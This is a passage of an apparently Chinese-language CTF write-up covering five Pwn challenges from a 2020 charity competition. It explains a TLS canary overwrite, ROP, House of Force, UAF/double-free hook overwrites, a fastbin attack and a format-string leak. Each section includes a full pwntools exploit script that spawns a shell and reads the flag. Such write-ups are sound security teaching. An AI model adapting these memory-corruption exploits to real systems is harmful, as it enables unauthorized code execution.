
# 2020-i春秋-公益CTF复盘-Pwn


                                阅读量   
                                **681142**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/199540/t0188f561f97d602fc6.png)](./img/199540/t0188f561f97d602fc6.png)



## 0x01 前言

在这次比赛中，有一些题还是很有亮点的，也是在比赛中学到了一些新知识，特此记录~



## 0x02 FirstDay_BFnote

本题由`5k1l[@W](https://github.com/W)&amp;M`、`咲夜南梦[@W](https://github.com/W)&amp;M`提供了思路提示，在此表示感谢~

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-015422.png)

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-015521.png)

题目流程较为明确，在Description和postscript处存在明显的栈溢出，但是题目开启了Canary保护导致栈溢出较难利用，程序接下来虽然产生了heap操作，但是因为没有free，且没有重复操作，导致heap几乎无法利用。

进一步可以看出，程序在`Line 24`进行了判断以保证`i`满足`i &lt;= size - 0x20`防止越界操作。但是！接下来读取`note`的内容时，程序却使用了`read(0, &amp;notebook[title_size + 0x10], size - title_size - 0x10);`。也就是说，此处并没有使用安全的`i`作为下标，于是存在一个越界写。

### <a class="reference-link" name="Canary%20%E7%BB%95%E8%BF%87"></a>Canary 绕过

#### <a class="reference-link" name="Canary%E5%AE%9E%E7%8E%B0"></a>Canary实现

canary的实现分为两部分, gcc编译时选择canary的插入位置, 以及生成含有canary的汇编代码, glibc产生实际的canary值, 以及提供错误捕捉函数和报错函数. 也就是gcc使用glibc提供的组件, gcc本身并不定义. 这样会让canary的值会是一个运行时才动态知道的值, 而不能通过查看静态的bianry得到。

此处我们重点研究glibc部分的实现：

首先是`/Glibc-2.23/debug/stack_chk_fail.c`，

明显可以看出关于函数退出时的定义：

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-031221.png)

接下来来看看Glibc是如何生成Canary值的，首先给出调用栈：

```
#0  security_init () at rtld.c:854 
#1  dl_main () at rtld.c:1818 //相当于glibc/dynamic-linker的main
#2  _dl_sysdep_start () at ../elf/dl-sysdep.c:249
#3  _dl_start_final () at rtld.c:331
#4  _dl_start () at rtld.c:557
#5  _start () from /lib/ld-linux.so.2// glibc/dynamic-linker入口
```

可以看出，主函数的逻辑还是很简单的，

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-031650.png)

其实_dl_random的值在进入这个函数的时候就已经由kernel写入了. 也就是说glibc直接使用了_dl_random的值并没有给赋值, 进入下面的函数会看到其实如果不是采用TLS这种模式支持, glibc是可以自己产生随机数的. 但是做为普遍情况来说, _dl_random就是由kernel写入的. 所以_dl_setup_stack_chk_guard()的行为就是将_dl_random的最后一个字节设置为0x00。

接下来，如果glibc中定义了THREAD_SET_STACK_GUARD则canary会被放在tls中，如果THREAD_SET_STACK_GUARD未定义则canary会被放在.bss中

一般来说，程序会启用TLS结构体机制，这会导致程序进入宏定义的第一部分。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-033417.png)

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-033848.png)

接下来的逻辑暂时没有跟进的需要,功能是将canary的值加入TLS结构体，那么TLS结构体是如何生成的呢。

生成TLS结构体的函数位于`glibc-2.23/elf/dl-tls.c`

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-041149.png)

可以看到，程序事实上调用了`__libc_memalign`函数来分配内存，而**`__libc_memalign`函数最终事实上调用的是`mmap`函数**！

#### <a class="reference-link" name="%E5%8A%AB%E6%8C%81TLS%E7%BB%93%E6%9E%84%E4%BD%93"></a>劫持TLS结构体

事实上，我们如果能够改写TLS结构体的内容，我们就能够直接覆盖Canary！

而刚刚说过，TLS结构体使用的是`mmap`函数分配的，如果我们能够直接使用mmap分配一个`Chunk`，就可以分配到和TLS结构体相邻的位置。而对于malloc函数来说，如果size足够大就能直接通过mmap分配内存给chunk！

我们一般设置size为`0x21000`或以上。

此处payload为：

```
sh.recvuntil('nGive your notebook size : ')
sh.sendline(str(int(0x24000)))
```

#### <a class="reference-link" name="%E8%A6%86%E7%9B%96TLS%E4%B8%AD%E7%9A%84Canary%E5%86%85%E5%AE%B9"></a>覆盖TLS中的Canary内容

此处我们需要计算出TLS结构体中Canary和我们可写起始地址的距离，我们通过调试计算，

首先在`0x080488C9`处下断点。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-042924.png)

可以看到，栈顶的`0xf7db8008`就是我们的`note_book`指针指向位置

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-043120.png)

然后使用`search`命令可以快速定位TLS中的canary值位置。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-043316.png)

可以计算偏移为`0x2570C`。

那么我们可以将`title_size`设置为`0x2570C`。

```
sh.recvuntil('Give your title size : ')
sh.sendline(str(int(0x2570C - 0x10)))
```

那么接下来向note写值时，程序将会向`notebook[title_size + 0x10]`即`0xf7db8008 + 0x2570C - 0x10 + 0x10`处写值。

```
sh.recvuntil('invalid ! please re-enter :n')
sh.sendline(str(int(0x10)))
sh.recvuntil('nGive your title : ')
sh.sendline('x00' * 0xF)
sh.recvuntil('Give your note : ')
sh.send('A' * 4)
```

#### <a class="reference-link" name="Canary%20Bypass%20%E9%AA%8C%E8%AF%81"></a>Canary Bypass 验证

```
sh.recvuntil('nGive your description : ')
sh.sendline('A' * 0x32 + 'AAAA' + p32(0))
sh.recvuntil('Give your postscript : ')
sh.sendline('Check')
sh.recvuntil('nGive your notebook size : ')
sh.sendline(str(int(0x24000)))
sh.recvuntil('Give your title size : ')
sh.sendline(str(int(0x2570C - 0x10)))
sh.recvuntil('invalid ! please re-enter :n')
sh.sendline(str(int(0x10)))
sh.recvuntil('nGive your title : ')
sh.sendline('x00' * 0xF)
sh.recvuntil('Give your note : ')
sh.send('A' * 4)
```

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-051019.png)

可以看到，Canary检查已经通过。

### <a class="reference-link" name="%E6%9E%84%E9%80%A0ROP%E9%93%BE%E2%80%94%E2%80%94%E6%80%9D%E8%B7%AF%E4%B8%80"></a>构造ROP链——思路一

接下来我们发现程序中没有合适的泄露函数以供我们leak libc。

⚠️：fwrite和fprintf都需要传入`stdout`的真实地址，而非存储`stdout`的地址。

那么，我们需要换一个思路来完成ROP构造，此时我们考虑使用Open-Read-Write来完成攻击。

但是很明显程序中没有fopen函数以供我们使用，我们考虑使用爆破的思路，但是使用symbols查看时，发现`fopen`和`fwrite`相距很远，无法构成爆破条件。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-132818.jpg)

但是在实际调试时发现地址出现了很大的变化！

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-132920.jpg)

经过查看libc内部符号发现，libc内居然存在两个fopen符号

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-22-133118.jpg)

而`Pwntools`中的`elf.symbols`明显属于使用了2.0版本的fopen。

这里发生的是glibc动态链接器支持符号版本控制，glibc使用它。 它从glibc 2.1导出一个版本的`fopen` ，从glibc 2.0导出一个具有不同接口的向后兼容版本。

那么我们就可以完成爆破脚本的编写了。

### <a class="reference-link" name="Final%20Exploit%E2%80%94%E2%80%94%E6%80%9D%E8%B7%AF%E4%B8%80"></a>Final Exploit——思路一

```
from pwn import *
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

BFnote=ELF('./BFnote', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./BFnote")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

if __name__ == "__main__":
    sh = get_sh()
    ppp_ret  = 0x080489d9
    pp__ret  = 0x080489da
    flag_st  = 0x0804A060
    read_md  = 0x0804A068

    payload  = '/flagx00x00x00'
    payload += 'rx00x00x00x00x00x00x00'
    payload  = payload.ljust(0x400,'x00')

    payload += p32(BFnote.plt['read'])
    payload += p32(ppp_ret)
    payload += p32(0)                                  # fd
    payload += p32(BFnote.got['fwrite'])               # buf
    payload += p32(2)                                  # size

    payload += p32(BFnote.plt['fwrite'])
    payload += p32(pp__ret)
    payload += p32(flag_st)                            # file name
    payload += p32(read_md)                            # open mode

    payload += p32(BFnote.plt['read'])
    payload += p32(ppp_ret)
    payload += p32(3)                                  # fd
    payload += p32(flag_st + 0x40)                     # buf
    payload += p32(0x40)                               # size

    payload += p32(BFnote.plt['read'])
    payload += p32(ppp_ret)
    payload += p32(0)                                  # fd
    payload += p32(BFnote.got['read'])                 # buf
    payload += p32(1)                                  # size

    payload += p32(BFnote.plt['read'])
    payload += p32(ppp_ret)
    payload += p32(1)                                  # fd
    payload += p32(flag_st + 0x40)                     # buf
    payload += p32(0x40)                               # size
    sh.recvuntil('nGive your description : ')
    sh.sendline('A' * 0x32 + 'AAAA' + p32(0) + p32(0x804A460 + 4))
    sh.recvuntil('Give your postscript : ')
    sh.sendline(payload)
    sh.recvuntil('nGive your notebook size : ')
    sh.sendline(str(int(0x24000)))
    sh.recvuntil('Give your title size : ')
    sh.sendline(str(int(0x2570C - 0x10)))
    sh.recvuntil('invalid ! please re-enter :n')
    sh.sendline(str(int(0x10)))
    sh.recvuntil('nGive your title : ')
    sh.sendline('x00' * 0xF)
    sh.recvuntil('Give your note : ')
    sh.send('A' * 4)

    raw_input('&gt;')
    sh.send(p16((sh.libc.address+0x5e400) &amp; 0xffff))

    raw_input('&gt;')
    sh.send('x70')

    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```

⚠️：sh.libc.address在remote模式下不可用，需要写死后两个字节，1/16的运行成功几率。

### <a class="reference-link" name="%E6%9E%84%E9%80%A0ROP%E9%93%BE%E2%80%94%E2%80%94%E6%80%9D%E8%B7%AF%E4%BA%8C"></a>构造ROP链——思路二

在`ROPgadget`中，我们看到了这样的`gadget`

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-052921.png)

然而我们又能通过`pop ebp`这个gadget直接控制ebp的值，那么我们就可以做到一个有限的任意地址写。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-053830.png)

可以看到，程序中和system离得最近，且小于system的函数是`exit()`，但是`exit()`函数未曾调用过，因此延迟绑定还没有生效。

那么我们可以首先控制ebp为`atol[@GOT](https://github.com/GOT) + 1 + 0x17fA8b40`。

然后执行`0x3AD - 0x2d2 = 0xDB`次的`inc dword ptr [ebp - 0x17fa8b40] ; ret 0`这相当于是对`atol[@GOT](https://github.com/GOT)`做了`+0xDB00`操作，然后在调用`read`向`atol[@GOT](https://github.com/GOT)`低位写入1字节，即可成功劫持`atol`函数的GOT表地址。

### <a class="reference-link" name="Final%20Exploit%E2%80%94%E2%80%94%E6%80%9D%E8%B7%AF%E4%BA%8C"></a>Final Exploit——思路二

```
from pwn import *
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

BFnote=ELF('./BFnote', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./BFnote")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

if __name__ == "__main__":
    sh = get_sh()
    p___ret  = 0x080489db
    pp__ret  = 0x080489da
    ppp_ret  = 0x080489d9
    binsh_a  = 0x0804A060
    read_md  = 0x0804A068

    payload  = '/bin/shx00'
    payload  = payload.ljust(0x200,'x00')

    payload += p32(p___ret)
    payload += p32(BFnote.got['atol'] + 1 + 0x17fA8b40)

    payload += p32(0x08048434) * 0xDB

    payload += p32(BFnote.plt['read'])
    payload += p32(ppp_ret)
    payload += p32(0)                                  # fd
    payload += p32(BFnote.got['atol'])                 # buf
    payload += p32(1)                                  # size

    payload += p32(BFnote.plt['atol'])
    payload += p32(p___ret)
    payload += p32(binsh_a)                            

    sh.recvuntil('nGive your description : ')
    sh.sendline('A' * 0x32 + 'AAAA' + p32(0) + p32(0x804A260 + 4))
    sh.recvuntil('Give your postscript : ')
    sh.sendline(payload)
    sh.recvuntil('nGive your notebook size : ')
    sh.sendline(str(int(0x24000)))
    sh.recvuntil('Give your title size : ')
    sh.sendline(str(int(0x2570C - 0x10)))
    sh.recvuntil('invalid ! please re-enter :n')
    sh.sendline(str(int(0x10)))
    sh.recvuntil('nGive your title : ')
    sh.sendline('x00' * 0xF)
    sh.recvuntil('Give your note : ')
    sh.send('A' * 4)

    raw_input('&gt;')
    sh.send('xA0')

    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```



## 0x03 FirstDay_force

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-070324.png)

全保护程序

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

可以发现，程序中只有一个add的功能，没有其他函数可以用，并且发现了一处明显的越界写可以用来劫持`Top Chunk`。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-071215.png)

于是使用`House of force`的攻击思路。

#### <a class="reference-link" name="Leak%20Libc"></a>Leak Libc

可以发现程序会告诉我们我们申请下来的chunk的位置，那么当我们申请一个极大Chunk时，程序会调用`mmap`进行内存分配，分配下来的地址是libc跟随的地址。

```
sh.recvuntil('2:puts')
sh.sendline('1')
sh.recvuntil('size')
sh.sendline(str(0x100000))
libc_base = get_address(sh,'We get libc base address is ','bin addr 0x','n',-0x4D2010,True)
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
sh.sendline('Chunk0')
```

#### <a class="reference-link" name="%E5%8A%AB%E6%8C%81Top%20Chunk"></a>劫持Top Chunk

构造如下payload可以修改Top Chunk的size域为`0xFFFFFFFFFFFFFFFF`，顺便泄露heap地址

```
sh.recvuntil('2:puts')
sh.sendline('1')
sh.recvuntil('size')
sh.sendline(str(0x20))
heap_base = get_address(sh,'We get heap base address is ','bin addr 0x','n',-0x10,True)
sh.sendline(p64(0) * 5 + p64(0xFFFFFFFFFFFFFFFF))
```

#### 劫持`__malloc_hook`

接下来我们要将Top_Chunk”推”到我们想要劫持的`__malloc_hook`处。

> 首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk head处就作为新的堆块被分配给用户了：试想，如果我们能控制top chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top chunk劫持到任意内存地址，然后就可以控制目标内存。

```
sh.recvuntil('2:puts')
sh.sendline('1')
sh.recvuntil('size')
sh.sendline(str(malloc_hook_addr - heap_base - 0x50))
sh.recvuntil('content')
sh.sendline('Anyvalue')
```

那么我们接下来就可以顺利的劫持`__malloc_hook`了。

```
sh.recvuntil('2:puts')
sh.sendline('1')
sh.recvuntil('size')
sh.sendline(str(0x10))
sh.recvuntil('content')
sh.sendline(p64(libc_base + libc.symbols['system']))
```

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

force=ELF('./force', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./force")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

if __name__ == "__main__":
    sh = get_sh()
    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(0x100000))
    libc_base = get_address(sh,'We get libc base address is ','bin addr 0x','n',-0x4D2010,True)
    sh.sendline('Chunk0')

    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(0x20))
    heap_base = get_address(sh,'We get heap base address is ','bin addr 0x','n',-0x10,True)
    sh.sendline(p64(0) * 5 + p64(0xFFFFFFFFFFFFFFFF))

    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(libc_base + libc.symbols['__malloc_hook'] - heap_base - 0x50))
    sh.recvuntil('content')
    sh.sendline('Anyvalue')

    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(0x10))
    sh.recvuntil('content')
    sh.sendline(p64(libc_base + libc.symbols['system']))

    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(libc_base + libc.search('/bin/sh').next()))

    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```



## 0x04 FirstDay_doucument

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-061256.png)

全保护都被开启了

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

分析delete函数可以很明显的看出存在UAF和Double Free漏洞

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-061639.png)

那么当我们释放一个chunk后，再申请的大小为0x20的chunk事实上都会被存储在可写区域，那么可以直接篡改Note的note指针，使之指向`__free_hook`，然后将其改写为`system`即可完成攻击。

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

doucument=ELF('./doucument', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec = False)
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./doucument")

def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address+offset)))
    return return_address+offset

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

def creat(sh,name,sex,information):
    sh.recvuntil('Give me your choice : ')
    sh.sendline('1')
    sh.recvuntil('input name')
    sh.send(name)
    sh.recvuntil('input sex')
    sh.send('W')
    sh.recvuntil('input information')
    sh.send(information)

def show(sh,index):
    sh.recvuntil('Give me your choice : ')
    sh.sendline('2')
    sh.recvuntil('Give me your index : ')
    sh.sendline(str(index))

def edit(sh,index,Change_sex,information):
    sh.recvuntil('Give me your choice : ')
    sh.sendline('3')
    sh.recvuntil('Give me your index : ')
    sh.sendline(str(index))
    sh.recvuntil('Are you sure change sex?')
    if Change_sex:
        sh.send('Y')
    else:
        sh.send('N')
    sh.recvuntil('Now change information')
    sh.send(information)

def delete(sh,index):
    sh.recvuntil('Give me your choice : ')
    sh.sendline('4')
    sh.recvuntil('Give me your index : ')
    sh.sendline(str(index))

if __name__ == "__main__":
    sh = get_sh()
    creat(sh,'/bin/shx00','W','/bin/shx00' * 14)
    creat(sh,'Chunk__1','W','A' * 0x70)
    creat(sh,'Chunk__2','W','B' * 0x70)

    delete(sh,1)
    show(sh,1)
    libc_base = get_address(sh,'We get libc address is ','x0A','x0A',-0x3C4B78)

    creat(sh,'Chunk__3','W','C' * 0x70)
    creat(sh,'Chunk__4','W','D' * 0x70)
    edit(sh,1,False,p64(0)+p64(0x21)+p64(libc_base + libc.symbols['__free_hook'] - 0x10) + p64(1) + p64(0) * 10)
    edit(sh,4,False,p64(libc_base + libc.symbols['system']) + p64(1) + p64(0) * 12)
    delete(sh,0)
    sh.interactive()
```



## 0x05 SecondDay_Some_thing_exceting

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-014648.png)

可以发现程序除了PIE之外保护全部开启了。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-014843.png)

可以发现，程序在启动时就已经将flag读入了BSS段，并且在存储flag的内存区域上方已经预留了一个`x60`

接着可以很快发现在delete函数中，程序在删除`banana`时，free后未将指针置0。存在UAF以及UAF衍生出的`Double free`漏洞。于是可以使用`fastbin attack`借助预留的`x60`将chunk直接分配过去，flag就会恰好在ba的位置，可以直接进行读取。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-015228.png)

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif context.arch == 'i386':
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./")
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./excited")

def get_address(sh,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

def creat(sh,name_size,name_value,desc_size,desc_value):
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('1')
    sh.recvuntil('&gt; ba's length : ')
    sh.sendline(str(name_size))
    sh.recvuntil('&gt; ba : ')
    sh.sendline(name_value)
    sh.recvuntil('&gt; na's length : ')
    sh.sendline(str(desc_size))
    sh.recvuntil('&gt; na : ')
    sh.sendline(desc_value)

def delete(sh,index):
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('3')
    sh.recvuntil('&gt; Banana ID : ')
    sh.sendline(str(index))

def show(sh,index):
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('4')
    sh.recvuntil('&gt; Banana ID : ')
    sh.sendline(str(index))

if __name__ == "__main__":
    sh = get_sh()
    creat(sh,0x50,'Chunk_1',0x50,'Chunk_2')
    creat(sh,0x50,'Chunk_3',0x50,'Chunk_4')
    delete(sh,0)
    delete(sh,1)
    delete(sh,0)
    creat(sh,0x50,p64(0x602098),0x50,'Chunk_2')
    creat(sh,0x50,'Chunk_3',0x50,'Chunk_4')
    creat(sh,0x50,'',0x30,'')
    show(sh,4)
    sh.interactive()
    sh.close()
```



## 0x06 SecondDay_Some_thing_interesting

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-020335.png)

本题保护全开。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

本题的漏洞利用难度要高一些，可以发现题目中提供了`Check Code`功能。

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-020620.png)

分析后发现了一个格式化字符串漏洞用来泄露程序的PIE~

[![](./img/199540/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-02-23-024041.png)

并且发现，delete函数处依旧存在UAF漏洞，那么可以利用`Fastbin Attack`劫持`Oreo list`进而篡改`free_hook`来get_shell。

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

interested=ELF('./interested')

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif context.arch == 'i386':
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")

def get_sh(other_libc = null):
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./")
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./interested")

def get_address(sh,info=null,start_string=null,end_string=null,int_mode=False):
    sh.recvuntil(start_string)
    if int_mode :
        return_address=int(sh.recvuntil(end_string).strip(end_string),16)
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    log.success(info+str(hex(return_address)))
    return return_address

def get_gdb(sh,stop=False):
    gdb.attach(sh)
    if stop :
        raw_input()

def creat(sh,name_size,name_value,desc_size,desc_value):
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('1')
    sh.recvuntil('&gt; O's length : ')
    sh.sendline(str(name_size))
    sh.recvuntil('&gt; O : ')
    sh.sendline(name_value)
    sh.recvuntil('&gt; RE's length : ')
    sh.sendline(str(desc_size))
    sh.recvuntil('&gt; RE : ')
    sh.sendline(desc_value)

def edit(sh,index,name_value,desc_value):
    sh.recvuntil('&gt; Now please tell me what you want to do :')
    sh.sendline('2')
    sh.recvuntil('&gt; Oreo ID : ')
    sh.sendline(str(index))
    sh.recvuntil('&gt; O : ')
    sh.sendline(name_value)
    sh.recvuntil('&gt; RE : ')
    sh.sendline(desc_value)

def delete(sh,index):
